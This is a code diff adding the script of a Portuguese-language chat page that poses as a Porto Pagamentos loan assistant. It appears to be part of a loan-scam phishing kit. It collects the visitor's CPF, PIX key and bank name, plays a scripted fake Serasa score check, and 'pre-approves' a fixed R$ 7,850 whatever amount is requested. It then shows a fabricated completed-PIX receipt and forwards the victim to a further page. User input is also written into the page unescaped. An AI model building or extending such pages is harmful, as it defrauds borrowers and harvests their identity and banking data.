+        m.innerHTML = `<div class="user-avatar"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg></div><div class="message-bubble"><div class="message-name">${userName}</div><div class="message-text">${text}</div><div class="message-time">${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}</div></div>`;
+      } else {
+        m.innerHTML = `<img src="../images/atendente.png" class="message-avatar"><div class="message-bubble"><div class="message-text">${text}</div><div class="message-time">${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}</div></div>`;
+      }
+      chatMessages.appendChild(m);
+      if (showOptions && questions[currentQuestion]) {
+        const op = document.createElement('div');
+        op.className = 'options-grid';
+        op.style.padding = '0 16px';
+        questions[currentQuestion].options.forEach(opt => {
+          const b = document.createElement('button');
+          b.className = 'option-card';
+          b.innerHTML = optionIcon(opt) + '<span class="option-label">' + opt + '</span><svg class="option-chevron" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 6l6 6-6 6"/></svg>';
+          b.onclick = () => handleOption(opt, op);
+          op.appendChild(b);
+        });
+        chatMessages.appendChild(op);
+      }
+      setTimeout(scrollToBottom, 50);
+    }
+
+    function showTyping() {
+      const t = document.createElement('div');
+      t.className = 'message attendant';
+      t.id = 'typing';
+      t.innerHTML = `<img src="../images/atendente.png" class="message-avatar"><div class="message-bubble"><div class="typing-indicator"><div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div></div></div>`;
+      chatMessages.appendChild(t);
+      scrollToBottom();
+    }
+
+    function removeTyping() { const t = document.getElementById('typing'); if (t) t.remove(); }
+
+    function optionIcon(opt) {
+      var o = (opt || '').toLowerCase();
+      var p;
+      if (o.indexOf('dívida') >= 0 || o.indexOf('divida') >= 0) p = '<rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/>';
+      else if (o.indexOf('negócio') >= 0 || o.indexOf('negocio') >= 0 || o.indexOf('investir') >= 0) p = '<path stroke-linecap="round" stroke-linejoin="round" d="M3 17l6-6 4 4 7-7"/><path stroke-linecap="round" stroke-linejoin="round" d="M17 8h4v4"/>';
+      else if (o.indexOf('casa') >= 0 || o.indexOf('reformar') >= 0) p = '<path stroke-linecap="round" stroke-linejoin="round" d="M3 11l9-8 9 8"/><path stroke-linecap="round" stroke-linejoin="round" d="M5 10v10h14V10"/>';
+      else if (o.indexOf('médica') >= 0 || o.indexOf('medica') >= 0 || o.indexOf('emergência') >= 0 || o.indexOf('emergencia') >= 0) p = '<path stroke-linecap="round" stroke-linejoin="round" d="M12 21C5 15 3 11 5 7c1.5-3 6-3 7 1 1-4 5.5-4 7-1 2 4 0 8-7 14z"/>';
+      else if (o.indexOf('tradicional') >= 0) p = '<path stroke-linecap="round" stroke-linejoin="round" d="M4 21h16M5 21V10m14 11V10M9 21v-5h6v5M4 10l8-6 8 6"/>';
+      else if (o.indexOf('digital') >= 0 || o.indexOf('celular') >= 0) p = '<rect x="7" y="3" width="10" height="18" rx="2"/><path d="M11 18h2"/>';
+      else if (o.indexOf('ambos') >= 0) p = '<rect x="3" y="6" width="18" height="13" rx="2"/><path d="M16 12h3"/>';
+      else if (o.indexOf('abrir') >= 0) p = '<circle cx="12" cy="12" r="9"/><path d="M12 9v6M9 12h6"/>';
+      else if (o === 'cpf') p = '<rect x="3" y="5" width="18" height="14" rx="2"/><circle cx="9" cy="12" r="2"/><path d="M14 10h4M14 14h4"/>';
+      else if (o.indexOf('mail') >= 0 || o.indexOf('e-mail') >= 0) p = '<rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/>';
+      else if (o.indexOf('aleatória') >= 0 || o.indexOf('aleatoria') >= 0 || o.indexOf('chave') >= 0) p = '<circle cx="8" cy="12" r="4"/><path d="M12 12h9l-2 2 2 2"/>';
+      else if (o.indexOf('dias') >= 0) p = '<rect x="3" y="5" width="18" height="16" rx="2"/><path d="M3 9h18M8 3v4M16 3v4"/>';
+      else if (o.indexOf('não') === 0 || o.indexOf('nao') === 0 || o.indexOf('corrigir') >= 0 || o.indexOf('obrigado') >= 0 || o.indexOf('incorreto') >= 0) p = '<circle cx="12" cy="12" r="9"/><path stroke-linecap="round" stroke-linejoin="round" d="M9 9l6 6M15 9l-6 6"/>';
+      else p = '<circle cx="12" cy="12" r="9"/><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4"/>';
+      return '<svg class="option-ic" fill="none" stroke="currentColor" viewBox="0 0 24 24">' + p + '</svg>';
+    }
+
+    function makeOptionCard(text, variant) {
+      var b = document.createElement('button');
+      b.className = 'option-card' + (variant ? ' ' + variant : '');
+      b.innerHTML = optionIcon(text) + '<span class="option-label">' + text + '</span><svg class="option-chevron" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 6l6 6-6 6"/></svg>';
+      return b;
+    }
+
+    function handleOption(option, container) {
+      container.querySelectorAll('.option-card').forEach(b => b.disabled = true);
+      addMessage(option, true);
+      setTimeout(() => {
+        container.remove();
+        if (questions[currentQuestion].type === 'pix') {
+          selectedPixType = option;
+          currentQuestion++;
+          if (option === 'CPF') {
+            const savedCpf = localStorage.getItem('cpf') || '';
+            if (savedCpf) {
+              const cpfFormatted = savedCpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+              tempPixKey = cpfFormatted;
+              setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage(`Sua chave PIX é:<br><br><strong>${cpfFormatted}</strong><br><br>Está correta?`); showPixConfirmButtons(); }, 1000); }, 500);
+            } else {
+              setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage(`Perfeito! Agora digite sua chave ${option}:`); setTimeout(() => showInput('pix', `Digite sua chave ${option}...`), 300); }, 1000); }, 500);
+            }
+          } else {
+            setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage(`Perfeito! Agora digite sua chave ${option}:`); setTimeout(() => showInput('pix', `Digite sua chave ${option}...`), 300); }, 1000); }, 500);
+          }
+        } else {
+          // Armazenar opção de prazo da primeira parcela
+          if (questions[currentQuestion].text.includes('começar a pagar as parcelas')) {
+            localStorage.setItem('prazo_parcela', option);
+          }
+          currentQuestion++;
+          if (currentQuestion < questions.length) { setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage(questions[currentQuestion].text, false, true); }, 1500); }, 800); }
+          else { finishChat(); }
+        }
+      }, 500);
+    }
+
+    let tempPixKey = '';
+
+    function sendPixKey(value) {
+      tempPixKey = value;
+      hideInput();
+      addMessage(value, true);
+      setTimeout(() => {
+        showTyping();
+        setTimeout(() => {
+          removeTyping();
+          addMessage(`Sua chave PIX é:<br><br><strong>${value}</strong><br><br>Está correta?`);
+          showPixConfirmButtons();
+        }, 1000);
+      }, 500);
+    }
+
+    function showPixConfirmButtons() {
+      const container = document.createElement('div');
+      container.className = 'options-grid';
+      container.id = 'pixConfirmContainer';
+      container.style.padding = '0 16px';
+
+      const btnSim = makeOptionCard('Sim, está correta', 'sim');
+      btnSim.onclick = () => confirmPixKey(true, container);
+
+      const btnNao = makeOptionCard('Não, quero corrigir', 'nao');
+      btnNao.onclick = () => confirmPixKey(false, container);
+
+      container.appendChild(btnSim);
+      container.appendChild(btnNao);
+      chatMessages.appendChild(container);
+      scrollToBottom();
+    }
+
+    function confirmPixKey(confirmed, container) {
+      container.querySelectorAll('.option-card').forEach(b => b.disabled = true);
+      
+      if (confirmed) {
+        addMessage('Sim, está correta', true);
+        pixKey = tempPixKey;
+        localStorage.setItem('chave_pix', tempPixKey);
+        setTimeout(() => {
+          container.remove();
+          showTyping();
+          setTimeout(() => {
+            removeTyping();
+            addMessage('Perfeito! Agora digite o nome do seu banco:');
+            setTimeout(() => showInput('bank', 'Digite o nome do banco...'), 300);
+          }, 1000);
+        }, 500);
+      } else {
+        addMessage('Não, quero corrigir', true);
+        setTimeout(() => {
+          container.remove();
+          showTyping();
+          setTimeout(() => {
+            removeTyping();
+            addMessage(`Ok! Digite novamente sua chave ${selectedPixType}:`);
+            setTimeout(() => showInput('pix', `Digite sua chave ${selectedPixType}...`), 300);
+          }, 1000);
+        }, 500);
+      }
+    }
+
+    function sendBank(value) { bankName = value; localStorage.setItem('banco', value); hideInput(); addMessage(value, true); setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage(questions[currentQuestion].text, false, true); }, 1500); }, 800); }
+
+    function finishChat() { 
+      setTimeout(() => { 
+        showTyping(); 
+        setTimeout(() => { 
+          removeTyping(); 
+          addMessage('Perfeito! Agora me diga: quanto você precisa?');
+          showAmountSlider();
+        }, 1000); 
+      }, 800); 
+    }
+
+    function showAmountSlider() {
+      const sliderContainer = document.createElement('div');
+      sliderContainer.className = 'slider-container';
+      sliderContainer.innerHTML = `
+        <div class="slider-card">
+          <div class="slider-header">
+            <span class="slider-label">Quanto você precisa?</span>
+            <div class="slider-value-display"><span class="cur">R$</span><span class="num" id="sliderValueDisplay">5.000</span></div>
+          </div>
+
+          <input type="range" min="1000" max="20000" value="5000" step="500" class="amount-slider" id="amountSlider">
+
+          <div class="slider-limits">
+            <span>R$ 1.000</span>
+            <span>R$ 20.000</span>
+          </div>
+
+          <div class="installments-preview">
+            <div class="installments-preview-title">Simulação de parcelas</div>
+            <div class="installments-preview-row" id="installmentsPreview"></div>
+          </div>
+          <p class="slider-note">Você escolhe o prazo no próximo passo</p>
+
+          <button class="slider-confirm-btn" id="sliderConfirmBtn">
+            Confirmar valor
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"></path></svg>
+          </button>
+        </div>
+      `;
+
+      chatMessages.appendChild(sliderContainer);
+      scrollToBottom();
+
+      const slider = document.getElementById('amountSlider');
+      const valueDisplay = document.getElementById('sliderValueDisplay');
+      const preview = document.getElementById('installmentsPreview');
+      const confirmBtn = document.getElementById('sliderConfirmBtn');
+      const taxa = 0.0049;
+
+      function updateSlider() {
+        const value = parseInt(slider.value);
+        const min = parseInt(slider.min);
+        const max = parseInt(slider.max);
+        const pct = (value - min) / (max - min) * 100;
+        valueDisplay.textContent = value.toLocaleString('pt-BR');
+        slider.style.background = `linear-gradient(90deg, #0099FF ${pct}%, #EEF0F4 ${pct}%)`;
+        preview.innerHTML = [12, 24, 36, 48].map(m => {
+          const parcela = value * taxa * Math.pow(1 + taxa, m) / (Math.pow(1 + taxa, m) - 1);
+          return `<div class="ip-col"><span class="ip-months">${m}x</span><div class="ip-value"><small>R$</small>${Math.round(parcela).toLocaleString('pt-BR')}</div><div class="ip-sub">por mês</div></div>`;
+        }).join('');
+      }
+      
+      slider.addEventListener('input', updateSlider);
+      updateSlider();
+      
+      confirmBtn.addEventListener('click', () => {
+        const value = parseInt(slider.value);
+        const LIMITE_APROVADO = 7850;
+        sliderContainer.style.pointerEvents = 'none';
+        sliderContainer.style.opacity = '0.7';
+
+        addMessage(value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL', minimumFractionDigits: 0 }), true);
+
+        setTimeout(() => {
+          sliderContainer.remove();
+          showTyping();
+
+          setTimeout(() => {
+            removeTyping();
+            addMessage('Aguarde, estou consultando o limite disponível no seu CPF...');
+            showTyping();
+
+            setTimeout(() => {
+              removeTyping();
+              addMessage('Verificando seu score de crédito junto ao Serasa...');
+
+              // Animação de score
+              const scoreBox = document.createElement('div');
+              scoreBox.className = 'score-box';
+              const faixas = [
+                { max: 300, cor: '#E5484D', bg: '#FDECEC', nome: 'Baixo' },
+                { max: 500, cor: '#4ab969', bg: '#FFF1E6', nome: 'Regular' },
+                { max: 700, cor: '#84CC16', bg: '#F1F9E4', nome: 'Bom' },
+                { max: 1000, cor: '#4ab969', bg: '#E7F6EC', nome: 'Excelente' }
+              ];
+              const cx = 120, cy = 120, raio = 100;
+              const ponto = sc => {
+                const ang = Math.PI - (sc / 1000) * Math.PI;
+                return [cx + raio * Math.cos(ang), cy - raio * Math.sin(ang)];
+              };
+              const arco = (de, ate) => {
+                const [x1, y1] = ponto(de), [x2, y2] = ponto(ate);
+                return `M ${x1.toFixed(2)} ${y1.toFixed(2)} A ${raio} ${raio} 0 0 1 ${x2.toFixed(2)} ${y2.toFixed(2)}`;
+              };
+              let inicio = 0;
+              const segmentos = faixas.map((f, i) => {
+                const d = arco(inicio + (i ? 6 : 0), f.max - (i < faixas.length - 1 ? 6 : 0));
+                inicio = f.max;
+                return `<path d="${d}" stroke="${f.cor}" stroke-width="16" fill="none" stroke-linecap="butt"/>`;
+              }).join('');
+              const pessoaNome = (localStorage.getItem('nome') || 'Cliente').trim().replace(/[<>&"]/g, '');
+              const cpfDigitos = (localStorage.getItem('cpf') || '').replace(/\D/g, '');
+              const pessoaCpf = cpfDigitos.length === 11 ? `${cpfDigitos.slice(0,3)}.${cpfDigitos.slice(3,6)}.${cpfDigitos.slice(6,9)}-${cpfDigitos.slice(9)}` : '***.***.***-**';
+              scoreBox.innerHTML = `
+                <div class="score-title" id="scoreTitle">Consultando score</div>
+                <div class="score-gauge">
+                  <svg viewBox="0 0 240 132">
+                    <path d="${arco(0, 1000)}" stroke="#F1F2F6" stroke-width="26" fill="none" stroke-linecap="round"/>
+                    ${segmentos}
+                    <g id="scoreNeedle" transform="rotate(0 ${cx} ${cy})" style="filter:drop-shadow(0 2px 3px rgba(0,0,0,.3))">
+                      <path d="M ${cx - 80} ${cy} L ${cx - 2} ${cy - 6} L ${cx - 2} ${cy + 6} Z" fill="#333333"/>
+                    </g>
+                    <circle cx="${cx}" cy="${cy}" r="10" fill="#333333"/>
+                    <circle cx="${cx}" cy="${cy}" r="4" fill="#0099FF"/>
+                  </svg>
+                </div>
+                <div class="score-ends"><span>0</span><span>1000</span></div>
+                <div class="score-center">
+                  <div class="score-number" id="scoreNumber" style="color:#E5484D">0</div>
+                  <div class="score-of">de 1000</div>
+                </div>
+                <div class="score-status" id="scoreStatus">Analisando...</div>
+                <div class="score-person">
+                  <div><span>Nome</span><b>${pessoaNome}</b></div>
+                  <div><span>CPF</span><b>${pessoaCpf}</b></div>
+                </div>
+              `;
+              chatMessages.appendChild(scoreBox);
+              scrollToBottom();
+
+              const scoreEl = document.getElementById('scoreNumber');
+              const needleEl = document.getElementById('scoreNeedle');
+              const statusEl = document.getElementById('scoreStatus');
+              const faixaDe = sc => faixas.find(f => sc <= f.max);
+              const suave = t => t < 0.5 ? 4 * t * t * t : 1 - Math.pow(-2 * t + 2, 3) / 2;
+              const etapas = [[0, 640, 2200], [640, 390, 1500], [390, 270, 1500]];
+              let etapa = 0, t0 = null;
+              const desenhar = sc => {
+                const f = faixaDe(sc);
+                scoreEl.textContent = Math.round(sc);
+                scoreEl.style.color = f.cor;
+                needleEl.setAttribute('transform', `rotate(${(sc / 1000 * 180).toFixed(2)} ${cx} ${cy})`);
+              };
+              const animar = agora => {
+                if (t0 === null) t0 = agora;
+                const [de, ate, dur] = etapas[etapa];
+                const t = Math.min((agora - t0) / dur, 1);
+                desenhar(de + (ate - de) * suave(t));
+                if (t < 1) return requestAnimationFrame(animar);
+                etapa++;
+                t0 = null;
+                if (etapa < etapas.length) return requestAnimationFrame(animar);
+                const f = faixaDe(270);
+                document.getElementById('scoreTitle').textContent = 'Seu score de crédito';
+                statusEl.textContent = 'Score ' + f.nome.toLowerCase();
+                statusEl.style.background = f.bg;
+                statusEl.style.color = f.cor;
+              };
+              requestAnimationFrame(animar);
+
+              setTimeout(() => {
+                showTyping();
+
+                setTimeout(() => {
+                  removeTyping();
+                  addMessage('Analisando condições de pagamento e taxas...');
+                  showTyping();
+
+                  setTimeout(() => {
+                    removeTyping();
+                    addMessage('Quase lá... finalizando sua análise de crédito...');
+                    showTyping();
+
+                    setTimeout(() => {
+                      removeTyping();
+                      scoreBox.remove();
+
+                      if (value > LIMITE_APROVADO) {
+                        addMessage(`O valor de ${value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL', minimumFractionDigits: 0 })} não está disponível para o seu perfil no momento.`);
+                        setTimeout(() => {
+                          showTyping();
+                          setTimeout(() => {
+                            removeTyping();
+                            addMessage(`Porém, após análise completa, identificamos um limite pré-aprovado de <strong style="font-size:18px;color:#0099FF;">R$ 7.850,00</strong> disponível para liberação imediata! ✅`);
+                            perguntarSeQuer();
+                          }, 2500);
+                        }, 2000);
+                      } else {
+                        addMessage(`Ótima notícia, ${userName}! Após análise completa do seu perfil, identificamos um limite pré-aprovado de <strong style="font-size:18px;color:#0099FF;">R$ 7.850,00</strong> disponível para liberação imediata! ✅`);
+                        perguntarSeQuer();
+                      }
+
+                      function perguntarSeQuer() {
+                        selectedLoanAmount = LIMITE_APROVADO;
+                        localStorage.setItem('selectedLoanAmount', LIMITE_APROVADO);
+                        localStorage.setItem('approvedLoanAmount', LIMITE_APROVADO);
+
+                        setTimeout(() => {
+                          showTyping();
+                          setTimeout(() => {
+                            removeTyping();
+                            addMessage('Deseja prosseguir com o valor de <strong>R$ 7.850,00</strong>?');
+
+                            const opContainer = document.createElement('div');
+                            opContainer.className = 'options-grid';
+                            opContainer.style.padding = '0 16px';
+
+                            const prosseguirComEmprestimo = (container, resposta) => {
+                              container.querySelectorAll('.option-card').forEach(b => b.disabled = true);
+                              addMessage(resposta, true);
+                              setTimeout(() => {
+                                container.remove();
+                                showTyping();
+                                setTimeout(() => {
+                                  removeTyping();
+                                  addMessage('Perfeito! Agora escolha em quantas vezes deseja pagar:');
+                                  showInstallmentOptions(LIMITE_APROVADO);
+                                }, 1500);
+                              }, 500);
+                            };
+
+                            const btnSim = makeOptionCard('Sim, quero prosseguir!', 'sim');
+                            btnSim.onclick = () => prosseguirComEmprestimo(opContainer, 'Sim, quero prosseguir!');
+
+                            const btnNao = makeOptionCard('Não, obrigado', 'nao');
+                            btnNao.onclick = () => {
+                              opContainer.querySelectorAll('.option-card').forEach(b => b.disabled = true);
+                              addMessage('Não, obrigado', true);
+                              setTimeout(() => {
+                                opContainer.remove();
+                                showTyping();
+                                setTimeout(() => {
+                                  removeTyping();
+                                  addMessage('Tudo bem! O valor de <strong>R$ 7.850,00</strong> ficará reservado no seu CPF por 24 horas. Se mudar de ideia, é só tocar no botão abaixo 👇');
+
+                                  // Evita que o chat termine sem saída: oferece retomar a contratação
+                                  const retomarContainer = document.createElement('div');
+                                  retomarContainer.className = 'options-grid';
+                                  retomarContainer.style.padding = '0 16px';
+                                  const btnRetomar = makeOptionCard('Mudei de ideia, quero prosseguir', 'sim');
+                                  btnRetomar.onclick = () => prosseguirComEmprestimo(retomarContainer, 'Mudei de ideia, quero prosseguir');
+                                  retomarContainer.appendChild(btnRetomar);
+                                  chatMessages.appendChild(retomarContainer);
+                                  scrollToBottom();
+                                }, 1200);
+                              }, 500);
+                            };
+
+                            opContainer.appendChild(btnSim);
+                            opContainer.appendChild(btnNao);
+                            chatMessages.appendChild(opContainer);
+                            scrollToBottom();
+                          }, 2000);
+                        }, 2000);
+                      }
+
+                    }, 3000);
+                  }, 2500);
+                }, 2500);
+              }, 6500);
+            }, 2500);
+          }, 2000);
+        }, 800);
+      });
+    }
+
+    function showInstallmentOptions(amount) {
+      const r = 0.0049;
+      const brl = v => v.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      const options = [3, 6, 12, 24, 36, 48, 60, 120].map(m => {
+        const monthly = (amount * (r * Math.pow(1 + r, m))) / (Math.pow(1 + r, m) - 1);
+        return { months: m, monthly, total: monthly * m };
+      });
+      let selected = options.find(o => o.months === 24);
+
+      const box = document.createElement('div');
+      box.className = 'installments-box';
+      box.innerHTML = `
+        <div class="ib-head">
+          <div class="ib-label">Escolha o prazo</div>
+          <div class="ib-sub">Crédito de <b>${brl(amount)}</b> · 0,49% a.m.</div>
+        </div>
+        <div class="ib-list">
+          ${options.map(o => `
+            <div class="ib-row${o === selected ? ' selected' : ''}" data-months="${o.months}">
+              <span class="ib-radio"></span>
+              <div class="ib-info">
+                <div class="ib-months">${o.months}x${o.months === 24 ? '<span class="ib-tag">Mais escolhido</span>' : ''}</div>
+                <div class="ib-total">Total ${brl(o.total)}</div>
+              </div>
+              <div class="ib-value">${brl(o.monthly)}</div>
+            </div>`).join('')}
+        </div>
+        <div class="ib-footer"><button class="ib-confirm"></button></div>
+      `;
+
+      const confirmBtn = box.querySelector('.ib-confirm');
+      const updateButton = () => { confirmBtn.textContent = `Confirmar ${selected.months}x de ${brl(selected.monthly)}`; };
+      box.querySelectorAll('.ib-row').forEach(row => {
+        row.addEventListener('click', () => {
+          selected = options.find(o => o.months === parseInt(row.dataset.months, 10));
+          box.querySelectorAll('.ib-row').forEach(x => x.classList.toggle('selected', x === row));
+          updateButton();
+        });
+      });
+      confirmBtn.addEventListener('click', () => selectInstallment(selected.months, selected.monthly, selected.total));
+      updateButton();
+
+      chatMessages.appendChild(box);
+      scrollToBottom();
+    }
+
+    function selectInstallment(months, monthly, total) {
+      selectedInstallments = months;
+      selectedMonthlyPayment = monthly;
+      localStorage.setItem('selectedInstallments', months);
+      localStorage.setItem('selectedMonthlyPayment', monthly);
+      document.querySelectorAll('.installments-box').forEach(c => { c.style.pointerEvents = 'none'; c.style.opacity = '0.6'; });
+      addMessage(`${months}x de ${monthly.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}`, true);
+      setTimeout(() => {
+        document.querySelectorAll('.installments-box').forEach(g => g.remove());
+        showTyping();
+        setTimeout(() => { removeTyping(); addMessage('Perfeito! Vou processar o pagamento agora...'); setTimeout(showReceipt, 1500); }, 1000);
+      }, 500);
+    }
+
+    function showReceipt() {
+      const tid = 'E' + Date.now().toString().substring(5);
+      const d = new Date();
+      const ds = d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
+      const ts = d.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+      const rn = userName || 'Cliente';
+      const rc = localStorage.getItem('cpf') || '000.000.000-00';
+      const r = document.createElement('div');
+      r.className = 'receipt-wrapper';
+      r.id = 'pixReceipt';
+      r.style.padding = '0 16px';
+      r.style.marginTop = '16px';
+      r.innerHTML = `
+        <div class="pix-receipt">
+          <div class="receipt-header">
+            <div style="margin:0 auto 12px;text-align:center"><img src="../images/logo.png" alt="Porto" style="height:42px;width:auto;"></div>
+            <div class="receipt-title">Comprovante de Solicitação via PIX</div>
+            <span class="receipt-status"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Concluído</span>
+          </div>
+          <div class="receipt-amount">
+            <div class="receipt-amount-label">Valor</div>
+            <div class="receipt-amount-value">${selectedLoanAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</div>
+          </div>
+          <div class="receipt-row"><span class="receipt-label">De</span><span class="receipt-value">Porto Pagamentos S.A.<br>CNPJ 18.236.120/0001-58</span></div>
+          <div class="receipt-row"><span class="receipt-label">Para</span><span class="receipt-value">${rn}<br>CPF ${rc}</span></div>
+          <div class="receipt-row"><span class="receipt-label">Chave PIX</span><span class="receipt-value">${pixKey}</span></div>
+          <div class="receipt-row"><span class="receipt-label">Banco Destino</span><span class="receipt-value">${bankName}</span></div>
+          <div class="receipt-row"><span class="receipt-label">Parcelas</span><span class="receipt-value">${selectedInstallments}x de ${selectedMonthlyPayment.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</span></div>
+          <div class="receipt-row"><span class="receipt-label">Data/Hora</span><span class="receipt-value">${ds} ${ts}</span></div>
+          <div class="receipt-row"><span class="receipt-label">ID Transação</span><span class="receipt-value">${tid}</span></div>
+          <div class="receipt-footer">Transação Agendada via PIX<br>Porto Pagamentos S.A.</div>
+        </div>`;
+      chatMessages.appendChild(r);
+      scrollToBottom();
+      setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage('Confirme digitando "SIM" para finalizar sua solicitação:'); setTimeout(() => showInput('confirmation', 'Digite SIM para confirmar...'), 300); }, 1500); }, 2000);
+    }
+
+    function sendConfirmation(value) {
+      if (value.toUpperCase() !== 'SIM') { alert('Por favor, digite "SIM" para confirmar'); return; }
+      hideInput();
+      addMessage('SIM', true);
+      setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage('Perfeito! Agora vou finalizar sua análise...'); setTimeout(() => { document.getElementById('chatContainer').style.display = 'none'; document.getElementById('loadingContainer').style.display = 'flex'; setTimeout(goToNextPage, 3000); }, 1500); }, 1000); }, 500);
+    }
+
+    function goToNextPage() {
+      const p = new URLSearchParams(window.location.search);
+      window.location.href = '../6/' + (p.toString() ? '?' + p : '');
+    }
+
+    loadUserData();
+    setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage(questions[0].text, false, true); }, 2000); }, 500);
+  </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
